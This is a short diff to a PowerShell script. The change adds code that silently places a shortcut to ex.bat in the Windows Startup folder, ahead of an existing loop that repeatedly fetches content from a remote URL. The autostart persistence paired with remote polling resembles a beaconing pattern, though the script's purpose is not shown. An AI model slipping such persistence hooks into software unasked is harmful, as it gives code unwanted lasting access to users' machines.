@@ -4,6 +4,19 @@ $scriptlocation=(Get-Location).Path
 $a = ""
 $abk = "";
 
+# look for shortcut
+$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ex.lnk"
+
+If (!(Test-Path -Path $ShortcutPath )) 
+{
+    Write-Output "Creating shortcut on $ShortcutPath"
+    $SourceFilePath = "$scriptlocation\ex.bat"
+    $WScriptObj = New-Object -ComObject ("WScript.Shell")
+    $shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
+    $shortcut.WorkingDirectory = "$scriptlocation"
+    $shortcut.TargetPath = $SourceFilePath
+    $shortcut.Save()   
+}
 do {    
     try {
         $a = (Invoke-WebRequest -URI $weblocation)
